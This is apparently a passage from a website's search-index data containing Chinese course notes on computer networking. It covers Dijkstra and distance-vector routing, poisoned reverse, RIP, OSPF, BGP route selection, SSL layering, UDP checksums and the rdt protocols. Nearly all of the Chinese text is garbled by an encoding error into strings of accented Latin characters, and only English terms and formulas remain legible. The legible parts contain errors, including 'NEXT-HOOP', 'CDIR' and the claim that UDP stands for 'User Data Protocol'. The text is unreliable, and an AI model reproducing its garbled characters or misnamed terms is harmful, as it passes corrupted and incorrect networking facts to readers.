ç»™å®šä¸€ç»„è·¯ç”±å™¨ä»¥åŠè¿æ¥è·¯ç”±å™¨çš„é“¾è·¯ï¼Œæ‰¾åˆ°ä¸€æ¡ä»æºè·¯ç”±å™¨åˆ°ç›®çš„è·¯ç”±å™¨çš„æœ€ä½æ¶ˆè€—è·¯å¾„ã€‚\n é“¾è·¯çŠ¶æ€é€‰æ‹©ç®—æ³• #  å…¨å±€å¼è·¯ç”±é€‰æ‹©ç®—æ³•ï¼ˆglobal routing algorithmï¼‰ç”¨å®Œæ•´çš„ã€å…¨å±€æ€§çš„ç½‘ç»œçŸ¥è¯†è®¡ç®—å‡ºä»æºåˆ°ç›®çš„åœ°ä¹‹é—´çš„æœ€ä½è´¹ç”¨è·¯å¾„ï¼šä»¥æ‰€æœ‰èŠ‚ç‚¹ä¹‹é—´çš„è¿é€šæ€§ä»¥åŠé“¾è·¯çš„è´¹ç”¨ä½œä¸ºè¾“å…¥ã€‚\nå®è·µä¸­ï¼Œå…·æœ‰å…¨å±€çŠ¶æ€ä¿¡æ¯çš„ç®—æ³•å¸¸è¢«ç§°ä½œé“¾è·¯çŠ¶æ€ç®—æ³•ï¼ˆLink State, LSï¼‰ï¼Œç»å¸¸ç”±é“¾è·¯çŠ¶æ€å¹¿æ’­ï¼ˆlink state broadcastï¼‰å®ç°ï¼ˆæ¯”å¦‚ OSPF è·¯ç”±é€‰æ‹©åè®®ï¼‰ï¼Œä½¿ç”¨ Dijkstra ç®—æ³•ï¼Œè®¡ç®—ç»“æœç»™å‡ºå¦‚ä¸‹ä¸¤ä¸ªå˜é‡ï¼š\n D(v): cost of the least-cost path from the source node to destination v as of this iteration of the algorithm. p(v): previous node (neighbor of v) along the current least-cost path from the source to v.  é€šè¿‡ p(v) å³å¯æ„é€ ä»æºè·¯ç”±å‡ºå‘åˆ°ç›®çš„è·¯ç”± v çš„è·¯å¾„ã€‚\nè·ç¦»å‘é‡è·¯ç”±ç®—æ³• #  åˆ†æ•£å¼è·¯ç”±é€‰æ‹©ç®—æ³•ï¼ˆdecentralized routing algorithmï¼‰ä»¥è¿­ä»£ã€åˆ†å¸ƒå¼çš„æ–¹å¼è®¡ç®—å‡ºæœ€ä½è´¹ç”¨è·¯å¾„ã€‚æ²¡æœ‰ç»“ç‚¹æ‹¥æœ‰å…³äºæ‰€æœ‰ç½‘ç»œé“¾è·¯è´¹ç”¨çš„å®Œæ•´ä¿¡æ¯ï¼Œè€Œæ¯ä¸ªç»“ç‚¹ä»…æœ‰ä¸å…¶ç›´æ¥ç›¸è¿é“¾è·¯çš„è´¹ç”¨çŸ¥è¯†å³å¯å¼€å§‹å·¥ä½œã€‚\nè·ç¦»å‘é‡ç®—æ³•ï¼ˆDistance-Vector, DVï¼‰æ˜¯ä¸€ç§è¿­ä»£çš„ã€å¼‚æ­¥çš„å’Œåˆ†å¸ƒå¼çš„ç®—æ³•ã€‚\nPreScriptï¼šé¦–å…ˆç»™å‡ºä¸‹é¢çš„ä¸€ä¸ªæ–¹ç¨‹ï¼š\n Bellman-Ford æ–¹ç¨‹ï¼š$${\\displaystyle d_x(y) = min_{v\\in neighbor(x)}{c(x,v), +d_v(y)} }$$ï¼Œå…¶ä¸­ $$d_x(y)$$ æ˜¯ä»ç»“ç‚¹ x åˆ° y çš„æœ€ä½è´¹ç”¨\n åœ¨ DV ç®—æ³•ä¸­ï¼Œæ¯ä¸ªç»“ç‚¹æ‹¥æœ‰ä»¥ä¸‹çš„ä¸‰ä¸ªè·¯ç”±ä¿¡æ¯ï¼š\n  For each neighbor v, the cost c(x,v) from x to directly attached neighbor, v\n  Node xâ€™s distance vector, that is, $$D_x = [D_x(y): y \\in N]$$, containing xâ€™s estimate of its cost to all destinations, y, in N\n  The distance vectors of each of its neighbors, that is, $$D_v = [D_v(y): y \\in N]$$ for each neighbor v of x\n  ç„¶ååˆ©ç”¨ Bellman-Ford æ–¹ç¨‹ï¼Œå¯ä»¥å¾—åˆ°åˆ°ç›®çš„åœ°å€çš„è·ç¦»å‘é‡ã€‚\né“¾è·¯è´¹ç”¨æ”¹å˜ä¸é“¾è·¯æ•…éšœ #  å½“è¿è¡Œ DV ç®—æ³•çš„ç»“ç‚¹æ£€æµ‹åˆ°ä»å®ƒè‡ªå·±åˆ°é‚»å±…çš„é“¾è·¯è´¹ç”¨å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä»–å°±æ›´æ–°å…¶è·ç¦»å‘é‡ï¼Œå¹¶ä¸”å¦‚æœæœ€ä½è´¹ç”¨å‘ç”Ÿäº†å˜åŒ–ï¼Œå‘é‚»å±…é€šçŸ¥å…¶æ–°çš„è·ç¦»å‘é‡ã€‚\nä¸€ä¸ªé—®é¢˜ï¼šé‡åˆ°é€‰æ‹©ç¯è·¯ â†’ æ— ç©·è®¡æ•°é—®é¢˜ã€‚\nå¢åŠ æ¯’æ€§é€†è½¬ #  é¿å…æ— ç©·è®¡æ•°é—®é¢˜ï¼šä¸€ç§ç§°ä¸ºæ¯’æ€§é€†è½¬ï¼ˆpoisoned reverseï¼‰çš„æŠ€æœ¯ï¼š\n å¦‚æœ z é€šè¿‡ y è·¯ç”±å‘é€ä¸€ä¸ªç›®çš„åœ°ä¸º x çš„æ•°æ®æŠ¥ï¼Œåˆ™ z å°†é€šå‘Š yï¼Œå®ƒåˆ° x çš„è·ç¦»æ˜¯æ­£æ— ç©·ï¼Œå› æ­¤ y åœ¨è¿›è¡Œè·¯ç”±é€‰æ‹©æ—¶æ°¸è¿œä¸ä¼šé€‰æ‹©ç»ç”± z åˆ° xï¼Œä»è€Œé¿å…äº†è·¯ç”±é€‰æ‹©ç¯è·¯é—®é¢˜ã€‚  å±€é™æ€§ï¼šæ¶‰åŠä¸‰ä¸ªæˆ–æ›´å¤šç»“ç‚¹è€Œä¸åªæ˜¯ä¸¤ä¸ªç›´æ¥ç›¸è¿çš„é‚»å±…ç»“ç‚¹çš„ç¯è·¯é—®é¢˜å°†æ— æ³•ä½¿ç”¨æ¯’æ€§é€†è½¬æŠ€æœ¯æ£€æµ‹ã€‚\nå±‚çº§è·¯ç”±é€‰æ‹© #  ä»¥ä¸Šçš„ä¸¤ä¸ªç®—æ³•åœ¨å®é™…åº”ç”¨ä¸­ä¼šå‡ºç° è§„æ¨¡ å’Œ ç®¡ç†è‡ªæ²» è¿™ä¸¤ä¸ªé‡è¦é—®é¢˜ã€‚\néƒ½å¯ä»¥é€šè¿‡å°†è·¯ç”±å™¨ç»„ç»‡è¿› è‡ªæ²»ç³»ç»Ÿï¼ˆAutonomous System, ASï¼‰æ¥è§£å†³ï¼Œæ¯ä¸ª AS ç”±ä¸€ç»„é€šå¸¸å¤„åœ¨ç›¸åŒç®¡ç†æ§åˆ¶ä¸‹çš„è·¯ç”±å™¨ç»„æˆï¼šåœ¨ç›¸åŒçš„ AS ä¸­çš„è·¯ç”±å™¨éƒ½å…¨éƒ¨è¿è¡ŒåŒæ ·çš„è·¯ç”±é€‰æ‹©ç®—æ³•ã€‚\nåœ¨ä¸€ä¸ªè‡ªæ²»ç³»ç»Ÿå†…è¿è¡Œçš„è·¯ç”±é€‰æ‹©ç®—æ³•å«åš è‡ªæ²»ç³»ç»Ÿå†…éƒ¨è·¯ç”±é€‰æ‹©åè®®ï¼ˆintra-autonomous system routing protocolï¼‰ã€‚\næœ‰ä¸€å°æˆ–å¤šå°è´Ÿè´£å‘åœ¨æœ¬ AS ä¹‹å¤–çš„ç›®çš„åœ°è½¬å‘åˆ†ç»„çš„è·¯ç”±å™¨ï¼Œè¢«ç§°ä½œ ç½‘å…³è·¯ç”±å™¨ï¼ˆgateway routerï¼‰ã€‚\nå› ç‰¹ç½‘ä¸­çš„è·¯ç”±é€‰æ‹© #  RIP åè®® #  RIP åè®®æ˜¯ä¸€ç§ AS å†…éƒ¨çš„è·¯ç”±é€‰æ‹©åè®®ï¼Œåˆç§°ä½œå†…éƒ¨ç½‘å…³åè®®ï¼ˆinterior gateway protocolï¼‰ã€‚AS å†…éƒ¨è·¯ç”±é€‰æ‹©åè®®ç”¨äºç¡®å®šåœ¨ä¸€ä¸ª AS å†…æ‰§è¡Œè·¯ç”±é€‰æ‹©çš„æ–¹å¼ã€‚\nRIP æ˜¯ä¸€ç§è·ç¦»å‘é‡åè®®ï¼Œåœ¨ [RFC 1058] ä¸­å®šä¹‰çš„ RIP ç‰ˆæœ¬ä½¿ç”¨è·³æ•°ä½œä¸ºå…¶è´¹ç”¨æµ‹åº¦ï¼Œå³æ¯æ¡é“¾è·¯çš„è´¹ç”¨ä¸º 1ã€‚\nRIP ä¸­ä¸€æ¡è·¯å¾„çš„æœ€å¤§è´¹ç”¨è¢«é™åˆ¶ä¸º 15ï¼Œå› æ­¤ RIP çš„ä½¿ç”¨é™åˆ¶åœ¨ç½‘ç»œç›´å¾„ä¸è¶…è¿‡ 15 è·³çš„è‡ªæ²»ç³»ç»Ÿå†…ã€‚\nè·¯ç”±é€‰æ‹©æ›´æ–°ä¿¡æ¯åœ¨é‚»å±…ä¹‹é—´é€šè¿‡ä¸€ç§ RIP å“åº”æŠ¥æ–‡ï¼ˆRIP response messageï¼‰æ¥äº¤æ¢ï¼Œå¤§çº¦æ¯ 30 ç§’ç›¸äº’äº¤æ¢ä¸€æ¬¡ï¼Œä¸€å°è·¯ç”±å™¨æˆ–ä¸»æœºå‘å‡ºçš„å“åº”æŠ¥æ–‡åŒ…å«äº†ä¸€ä¸ªè¯¥ AS å†…çš„å¤šè¾¾ 25 ä¸ªç›®çš„çš„å­ç½‘åˆ—è¡¨ï¼Œä»¥åŠå‘é€æ–¹åˆ°æ¯ä¸ªå­ç½‘ä¹‹é—´çš„è·ç¦»ã€‚å“åº”æŠ¥æ–‡åˆç§°ä½œ RIP é€šå‘Šï¼ˆRIP advertisementï¼‰ã€‚\næ¯å°è·¯ç”±å™¨ç»´æŠ¤ä¸€å¼ ç§°ä¸ºè·¯ç”±é€‰æ‹©è¡¨ï¼ˆrouting tableï¼‰çš„ RIP è¡¨ã€‚\nOSPF åè®® #  OSPF åè®®ä¹Ÿæ˜¯ä¸€ç§ AS å†…éƒ¨çš„è·¯ç”±é€‰æ‹©åè®®ã€‚\nOSPF åè®®ï¼ˆä¸ IS-IS åè®®ï¼‰é€šå¸¸éƒ½è®¾ç½®åœ¨ä¸Šå±‚ ISP ä¸­ï¼Œè€Œ RIP é€šå¸¸è®¾ç½®åœ¨ä¸‹å±‚ ISP å’Œä¼ä¸šç½‘ä¸­ã€‚\nOSPF åè®®çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªä½¿ç”¨æ´ªæ³›é“¾è·¯çŠ¶æ€ä¿¡æ¯çš„é“¾è·¯çŠ¶æ€åè®®å’Œä¸€ä¸ª Dijkstra æœ€ä½è´¹ç”¨è·¯å¾„ç®—æ³•ã€‚\nä½¿ç”¨ OSPF æ—¶ï¼Œè·¯ç”±å™¨å‘è‡ªæ²»ç³»ç»Ÿå†…æ‰€æœ‰å…¶ä»–è·¯ç”±å™¨å¹¿æ’­è·¯ç”±é€‰æ‹©ä¿¡æ¯ï¼Œè€Œä¸ä»…ä»…å‘å…¶ç›¸é‚»è·¯ç”±å™¨å¹¿æ’­ã€‚æ¯å½“ä¸€æ¡é“¾è·¯çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè·¯ç”±å™¨å°±ä¼šå¹¿æ’­é“¾è·¯çŠ¶æ€ä¿¡æ¯ã€‚å³ä½¿é“¾è·¯çŠ¶æ€æœªå‘ç”Ÿå˜åŒ–ã€‚å®ƒä¹Ÿè¦å‘¨æœŸæ€§åœ°ï¼ˆè‡³å°‘æ¯éš” 30 åˆ†é’Ÿä¸€æ¬¡ï¼‰å¹¿æ’­é“¾è·¯çŠ¶æ€ã€‚OSPF åè®®è¿˜è¦æ£€æŸ¥é“¾è·¯æ­£åœ¨è¿è¡Œï¼ˆé€šè¿‡å‘ç›¸è¿çš„é‚»å±…å‘é€ HELLO æŠ¥æ–‡ï¼‰ï¼Œå¹¶å…è®¸ OSPF è·¯ç”±å™¨è·å¾—ç›¸é‚»è·¯ç”±å™¨çš„ç½‘ç»œèŒƒå›´é“¾è·¯çŠ¶æ€çš„æ•°æ®åº“ã€‚\nOSPF åè®®æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š\n å®‰å…¨ï¼šèƒ½å¤Ÿé‰´åˆ« OSPF è·¯ç”±å™¨ä¹‹é—´çš„äº¤æ¢ã€‚ä½¿ç”¨é‰´åˆ«ï¼Œä»…æœ‰å—ä¿¡ä»»çš„è·¯ç”±å™¨èƒ½å‚ä¸ä¸€ä¸ª AS å†…çš„ OSPF åè®®ã€‚ å¤šæ¡ç›¸åŒè´¹ç”¨çš„è·¯å¾„ï¼šOSPF å…è®¸ä½¿ç”¨å¤šæ¡è·¯å¾„ã€‚ å¯¹å•æ’­ä¸å¤šæ’­è·¯ç”±é€‰æ‹©çš„ç»¼åˆæ”¯æŒï¼šå¤šæ’­ OSPFï¼ˆMOSPFï¼‰æä¾›å¯¹ OSPF çš„ç®€å•æ‰©å±•ã€‚ æ”¯æŒåœ¨å•ä¸ªè·¯ç”±é€‰æ‹©åŸŸå†…çš„å±‚æ¬¡ç»“æ„ï¼šæœ€é‡è¦çš„ä¼˜ç‚¹ã€‚  BGP åè®® #  BGP(Border Gateway Protocol) åè®®æ˜¯æ˜¯ä¸€ç§ AS é—´çš„è·¯ç”±é€‰æ‹©åè®®ã€‚\nBGP ä¸ºæ¯ä¸ª AS æä¾›äº†è¿›è¡Œä»¥ä¸‹å·¥ä½œçš„æ‰‹æ®µï¼š\n ä»ç›¸é‚» AS å‡ºè·å¾—å­ç½‘å¯è¾¾æ€§ä¿¡æ¯ï¼› å‘æœ¬ AS å†…éƒ¨çš„æ‰€æœ‰è·¯ç”±å™¨ä¼ æ’­è¿™äº›å¯è¾¾æ€§ä¿¡æ¯ï¼› åŸºäºå¯è¾¾æ€§ä¿¡æ¯å’Œ AS ç­–ç•¥ï¼Œå†³å®šåˆ°è¾¾å­ç½‘çš„ â€œå¥½â€ è·¯ç”±ã€‚  BGP åŸºç¡€ #  åœ¨ BGP ä¸­ï¼Œè·¯ç”±å™¨å¯¹é€šè¿‡ä½¿ç”¨ 179 ç«¯å£çš„åŠæ°¸ä¹… TCP è¿æ¥æ¥äº¤æ¢è·¯ç”±é€‰æ‹©ä¿¡æ¯ï¼š\n ä½äºè¿æ¥ç«¯ç‚¹çš„ä¸¤å°è·¯ç”±å™¨ç§°ä¸º BGP å¯¹ç­‰æ–¹ï¼ˆBGP peersï¼‰ æ²¿ç€è¿æ¥å‘é€æ‰€æœ‰ BGP æŠ¥æ–‡çš„ TCP è¿æ¥ç§°ä¸º BGP ä¼šè¯ï¼ˆBGP sessionsï¼‰ è·¨è¶Šä¸¤ä¸ª AS çš„ BGP ä¼šè¯ç§°ä¸º å¤–éƒ¨ BGP ä¼šè¯ï¼ˆexternal BGP session, eBGPï¼‰ åœ¨åŒä¸€ä¸ª AS å†…éƒ¨çš„ BGP ä¼šè¯ç§°ä¸º å†…éƒ¨ BGP ä¼šè¯ï¼ˆinternal BGP session, iBGPï¼‰  BGP ä½¿å¾—æ¯ä¸ª AS çŸ¥é“ç»è¿‡å…¶ç›¸é‚»çš„ AS å¯è¾¾å“ªäº›ç›®çš„åœ°ï¼ˆCDIR åŒ–çš„å‰ç¼€ï¼ˆprefixï¼‰ï¼‰\nè·¯å¾„å±æ€§å’Œ BGP è·¯ç”± #  åœ¨ BGP ä¸­ï¼Œä¸€ä¸ª AS ç”±å…¶å…¨å±€å”¯ä¸€çš„è‡ªæ²»ç³»ç»Ÿå·ï¼ˆAutonomous System Number, ASNï¼‰æ‰€æ ‡è¯†ï¼Œç”± ICANN åœ°åŒºæ³¨å†Œæœºæ„åˆ†é…ã€‚\nå½“ä¸€å°è·¯ç”±å™¨é€šè¿‡ BGP ä¼šè¯é€šå‘Šä¸€ä¸ªå‰ç¼€æ—¶ï¼Œå®ƒåœ¨å‰ç¼€ä¸­åŒ…å«ä¸€äº› BGP å±æ€§ï¼ˆåœ¨ BGP æœ¯è¯­ä¸­ï¼Œå¸¦æœ‰å±æ€§çš„å‰ç¼€è¢«ç§°ä¸ºä¸€æ¡è·¯ç”±ï¼ˆrouteï¼‰ï¼‰ä¸¤ä¸ªè¾ƒä¸ºé‡è¦çš„å±æ€§ï¼š\n  AS-PATHï¼šè¯¥å±æ€§åŒ…æ‹¬äº†å‰ç¼€é€šå‘Šå·²ç»é€šçŸ¥è¿‡çš„é‚£äº› ASã€‚å½“ä¸€ä¸ªå‰ç¼€é€šå‘Šä¼ é€åˆ°ä¸€ä¸ª AS æ—¶ï¼Œè¯¥ AS å°†å®ƒçš„ ASN å¢åŠ åˆ° AS-PATH å±æ€§ä¸­ã€‚\n  NEXT-HOOPï¼šThe NEXT-HOP is the router interface that begins the AS-PATH. å³ç›¸é‚» AS ç½‘å…³è·¯ç”±å™¨ä¹‹é—´çš„ IP åœ°å€ã€‚\n  BGP çš„è·¯ç”±é€‰æ‹© #  å¦‚æœå¯¹ç›¸åŒå‰ç¼€å­˜åœ¨ä¸¤æ¡æˆ–å¤šæ¡è·¯ç”±ï¼Œåˆ™ BGP é¡ºåºåœ°è°ƒç”¨ä¸‹é¢çš„æ¶ˆé™¤è§„åˆ™ï¼Œç›´åˆ°ç•™ä¸‹ä¸€æ¡è·¯ç”±ï¼š\n è·¯ç”±è¢«æŒ‡æ´¾ä¸€ä¸ªæœ¬åœ°åå¥½å€¼ä½œä¸ºä»–ä»¬çš„å±æ€§ä¹‹ä¸€ï¼Œå…·æœ‰æœ€é«˜æœ¬åœ°åå¥½å€¼çš„è·¯ç”±å°†è¢«é€‰æ‹©ã€‚ åœ¨ä½™ä¸‹çš„è·¯ç”±ä¸­ï¼Œå…·æœ‰æœ€çŸ­ AS-PATH çš„è·¯ç”±å°†è¢«é€‰æ‹©ã€‚ åœ¨ä½™ä¸‹çš„è·¯ç”±ä¸­ï¼Œå…·æœ‰æœ€é è¿‘ NEXT-HOOP çš„è·¯ç”±å°†è¢«é€‰æ‹©ã€‚ å¦‚æœä»å‰©ä¸‹å¤šæ¡è·¯ç”±ã€‚ä½¿ç”¨ BGP æ ‡è¯†ç¬¦æ¥é€‰æ‹©è·¯ç”±ã€‚  "},{"id":388,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/ssl/","title":"Ssl","section":"4.ä¼ è¾“å±‚","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.cnblogs.com/bhlsheji/p/4586597.html   SSL #  åè®®å·¥ä½œè¿‡ç¨‹ #  åˆ†å±‚ç»“æ„ #  SSL ä½äºåº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´ï¼Œå®ƒèƒ½å¤Ÿä¸ºä¸è®ºä»€ä¹ˆåŸºäº TCP ç­‰å¯é è¿æ¥çš„åº”ç”¨å±‚åè®®æä¾›å®‰å…¨æ€§ä¿è¯ã€‚SSL åè®®æœ¬èº«åˆ†ä¸ºä¸¤å±‚ï¼š\n  ä¸Šå±‚ä¸º SSL æ¡æ‰‹åè®® (SSL handshake protocol)ã€SSLpassword å˜åŒ–åè®® (SSL change cipher spec protocol) å’Œ SSL è­¦å‘Šåè®® (SSL alert protocol)ã€‚\n  åº•å±‚ä¸º SSL è®°å½•åè®® (SSL record protocol)ã€‚\n  å½“ä¸­ï¼š\n  SSL æ¡æ‰‹åè®®ï¼šæ˜¯ SSL åè®®å¾ˆé‡è¦çš„ç»„æˆéƒ¨åˆ†ã€‚ç”¨æ¥åå•†é€šä¿¡è¿‡ç¨‹ä¸­ä½¿ç”¨çš„åŠ å¯†å¥—ä»¶(åŠ å¯†ç®—æ³•ã€å¯†é’¥äº¤æ¢ç®—æ³•å’Œ MAC ç®—æ³•ç­‰)ã€åœ¨ server å’Œ client ä¹‹é—´å®‰å…¨åœ°äº¤æ¢å¯†é’¥ã€å®ç° server å’Œ client çš„èº«ä»½éªŒè¯ã€‚\n  SSLpassword å˜åŒ–åè®®ï¼šclient å’Œ server ç«¯é€šè¿‡ password å˜åŒ–åè®®é€šçŸ¥å¯¹ç«¯ã€‚éšåçš„æŠ¥æ–‡éƒ½å°†ä½¿ç”¨æ–°åå•†çš„åŠ å¯†å¥—ä»¶å’Œå¯†é’¥è¿›è¡Œä¿æŠ¤å’Œä¼ è¾“ã€‚\n  SSL è­¦å‘Šåè®®ï¼šç”¨æ¥å‘é€šä¿¡å¯¹ç«¯æŠ¥å‘Šå‘Šè­¦ä¿¡æ¯ï¼Œæ¶ˆæ¯ä¸­åŒ…æ‹¬å‘Šè­¦çš„ä¸¥é‡çº§åˆ«å’Œæå†™å™è¿°ã€‚\n  SSL è®°å½•åè®®ï¼šä¸»è¦è´Ÿè´£å¯¹ä¸Šå±‚çš„æ•°æ® (SSL æ¡æ‰‹åè®®ã€SSLpassword å˜åŒ–åè®®ã€SSL è­¦å‘Šåè®®å’Œåº”ç”¨å±‚åè®®æŠ¥æ–‡) è¿›è¡Œåˆ†å—ã€è®¡ç®—å¹¶åŠ å…¥ MAC å€¼ã€åŠ å¯†ã€‚å¹¶æŠŠå¤„ç†åçš„è®°å½•å—ä¼ è¾“ç»™å¯¹ç«¯ã€‚\n  SSL æ¡æ‰‹è¿‡ç¨‹ #  SSL é€šè¿‡æ¡æ‰‹è¿‡ç¨‹åœ¨ client å’Œ server ä¹‹é—´åå•†ä¼šè¯åƒæ•°ï¼Œå¹¶å»ºç«‹ä¼šè¯ã€‚ä¼šè¯åŒ…æ‹¬çš„ä¸»è¦åƒæ•°æœ‰ä¼šè¯ IDã€å¯¹æ–¹çš„è¯ä¹¦ã€åŠ å¯†å¥—ä»¶ï¼ˆå¯†é’¥äº¤æ¢ç®—æ³•ã€æ•°æ®åŠ å¯†ç®—æ³•å’Œ MAC ç®—æ³•ç­‰ï¼‰ä»¥åŠä¸»å¯†é’¥ï¼ˆmaster secretï¼‰ã€‚é€šè¿‡ SSL ä¼šè¯ä¼ è¾“çš„æ•°æ®ï¼Œéƒ½å°†æ¡ç”¨è¯¥ä¼šè¯çš„ä¸»å¯†é’¥å’ŒåŠ å¯†å¥—ä»¶è¿›è¡ŒåŠ å¯†ã€è®¡ç®— MAC ç­‰å¤„ç†ã€‚\n ä»…éªŒè¯ server çš„ SSL æ¡æ‰‹è¿‡ç¨‹ï¼š   "},{"id":389,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/tcp/","title":"Tcp","section":"4.ä¼ è¾“å±‚","content":" å­¦ä¹ ç½‘å€ï¼š\n https://blog.csdn.net/a19881029/article/details/38091243   "},{"id":390,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E4%BC%A0%E8%BE%93%E5%B1%82/%E8%BF%90%E8%BE%93%E5%B1%82/","title":"è¿è¾“å±‚","section":"4.ä¼ è¾“å±‚","content":" å­¦ä¹ åœ°å€ï¼š\n ã€Šè®¡ç®—æœºç½‘è·¯ï¼Œè‡ªé¡¶å‘ä¸‹çš„æ–¹æ³•ã€‹   è¿è¾“å±‚ #  æ— è¿æ¥è¿è¾“ï¼šUDP #  UDP stands for User Data Protocol.\næŠ¥æ–‡ç»“æ„ #  UDP é¦–éƒ¨åªæœ‰å››ä¸ªå­—æ®µï¼Œæ¯ä¸ªå­—æ®µé¦–éƒ¨ç”±ä¸¤ä¸ªå­—èŠ‚ç»„æˆã€‚\nUDP çš„æŠ¥æ–‡æ®µç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®ƒç”± RFC 768 å®šä¹‰ï¼š\nUDP æ ¡éªŒå’Œ #  ä¼ªåè®®å¤´ï¼š\n ç”¨äºè®¡ç®— checksum åŒ…æ‹¬æº IP åœ°å€å’Œç›®çš„ IP åœ°å€ã€‚  NOTICEï¼š\n  UDP æ ¡éªŒå’Œæ˜¯å¯é€‰é¡¹ï¼ŒIPv6 ä¸­å°†å˜æˆå¼ºåˆ¶æ€§çš„ï¼ˆUDP æ ¡éªŒå’Œè¦†ç›–çš„èŒƒå›´è¶…å‡ºäº† UDP æ•°æ®æŠ¥æœ¬èº«ï¼‰\n  ä½¿ç”¨ä¼ªé¦–éƒ¨çš„ç›®çš„æ˜¯æ£€éªŒ UDP æ•°æ®æŠ¥æ˜¯å¦çœŸæ­£åˆ°è¾¾ç›®çš„åœ°ã€‚æ­£ç¡®çš„ç›®çš„åœ°åŒ…æ‹¬äº†ç‰¹å®šçš„ä¸»æœºå’Œè¯¥ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£\n  ä¼ªé¦–éƒ¨ä¸éšç”¨æˆ·æ•°æ®æŠ¥ä¸€èµ·ä¼ è¾“\n  æ¥æ”¶æ–¹éœ€è‡ªå·±å½¢æˆä¼ªé¦–éƒ¨è¿›è¡Œæ ¡éªŒ\n  ä¼ªé¦–éƒ¨çš„ä½¿ç”¨ç ´åäº†å±‚æ¬¡åˆ’åˆ†çš„åŸºæœ¬å‰æï¼Œå³æ¯ä¸€å±‚çš„åŠŸèƒ½ç‹¬ç«‹\n  ç›®çš„ä¸»æœºçš„ IP åœ°å€ UDP é€šå¸¸çŸ¥é“ï¼Œæº IP çš„ä½¿ç”¨éœ€è¦é€šè¿‡è·¯ç”±é€‰æ‹©å†³å®š\n  å¯é ä¿¡æ¯ä¼ è¾“åŸç† #  å¯é æ•°æ®ä¼ è¾“åè®®ï¼šreliable data transfer protocol\næ„é€ å¯é ä¿¡æ¯ä¼ è¾“åè®® #  ç»å®Œå…¨å¯é ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“ rdt 1.0 #  å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„æœ‰é™çŠ¶æ€æœºï¼ˆFinite-State Machine, FSMï¼‰å¦‚ä¸‹ï¼š\nç»å…·æœ‰æ¯”ç‰¹å·®é”™ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“ rdt 2.0 #  æˆ‘ä»¬å¼•å…¥è‡ªåŠ¨é‡ä¼ è¯·æ±‚ï¼ˆAutomatic Repeat reQuest, ARQï¼‰åè®®ï¼Œä¸»è¦åŠ å…¥äº†ä»¥ä¸‹çš„ä¸‰ç§åŠŸèƒ½ï¼š\n å·®é”™æ£€æŸ¥ï¼šéœ€è¦ä¸€ç§æœºåˆ¶ä»¥ä½¿æ¥æ”¶æ–¹æ£€æµ‹åˆ°åˆé€‚å‡ºç°äº†æ¯”ç‰¹å·®é”™ï¼› æ¥æ”¶æ–¹åé¦ˆï¼šå¼•å…¥äº†æ¥æ”¶åˆ°æ–¹å›ç­”çš„ â€œè‚¯å®šç¡®è®¤â€ï¼ˆACKï¼‰å’Œ â€œå¦å®šç¡®è®¤â€ï¼ˆNAKï¼‰ï¼Œç†è®ºä¸Šï¼Œè¿™äº›åˆ†ç»„åªéœ€è¦ä¸€ä¸ªæ¯”ç‰¹é•¿ï¼šå¦‚ 0 è¡¨ç¤ºå¦å®šï¼Œ1 è¡¨ç¤ºè‚¯å®šã€‚ é‡ä¼ ï¼šæ¥æ”¶æ–¹å—åˆ°ç”±å·®é”™çš„åˆ†ç»„æ—¶ï¼Œå‘é€æ–¹å°†é‡ä¼ è¯¥åˆ†ç»„ã€‚  rdt 2.0 çš„ FSM å¦‚ä¸‹ï¼š\nå¯è§å‘é€æ–¹å­˜åœ¨ä¸€ä¸ªç­‰å¾…å›ç­”çš„çŠ¶æ€ï¼Œæ‰€ä»¥ rdt2.0 åˆç§°ä½œ â€œåœç­‰ï¼ˆstop-and-waitï¼‰åè®®â€ã€‚\nä½†æ˜¯ï¼Œrdt2.0 å­˜åœ¨ä¸€ä¸ªè‡´å‘½ç¼ºé™·ï¼šå®ƒæ²¡æœ‰è€ƒè™‘ ACK å’Œ NAK åˆ†ç»„å—æŸçš„æƒ…å†µï¼Œæˆ‘ä»¬æå‡ºä»¥ä¸‹ä¸‰ç§è§£å†³æ–¹æ³•ï¼š\n å‘é€æ–¹æ”¶åˆ°æ¥è‡ªæ¥æ”¶æ–¹çš„æŸå ACK æˆ– NAK çš„è¯·æ±‚å†æ¬¡å‘é€ã€‚ä½†æ˜¯å¦‚æœè¯¥åŒ…ä¹Ÿåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å—æŸçš„è¯ï¼Œé€»è¾‘å°±é™·å…¥äº†æ­»å¾ªç¯ã€‚ å¢åŠ è¶³å¤Ÿçš„æ ¡éªŒæ¯”ç‰¹ä½ï¼Œä½¿å¾—å‘é€æ–¹ä¸ä»…å¯ä»¥æ£€æµ‹å·®é”™ï¼Œè¿˜å¯ä»¥æ¢å¤å·®é”™ã€‚ å½“å‘é€æ–¹æ”¶åˆ°å«ç³Šä¸æ¸…çš„ ACK æˆ– NAK åˆ†ç»„æ—¶ï¼Œåªéœ€é‡ä¼ å½“å‰æ•°æ®åˆ†ç»„å³å¯ã€‚  ç„¶è€Œè¿™ç§æ–¹æ³•åœ¨å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„ä¿¡é“ä¸­å¼•å…¥äº† å†—ä½™åˆ†ç»„ï¼ˆduplicate 